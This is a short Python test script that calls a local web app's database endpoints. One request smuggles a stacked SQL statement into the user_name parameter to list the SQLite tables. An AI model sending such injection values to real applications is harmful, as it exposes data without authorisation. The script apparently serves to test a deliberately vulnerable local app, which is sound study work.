import requests

res = requests.get("http://127.0.0.1:5000/initialize-database")
print(res.json())

parameters = {"user_name" : "Omar"}
res = requests.get("http://127.0.0.1:5000/select-image", params=parameters)
print(res.json())

injection_parameters = "format=json&user_name=Omar;SELECT name FROM sqlite_master;"
res = requests.get("http://127.0.0.1:5000/select-image", params=injection_parameters)
print(res.json())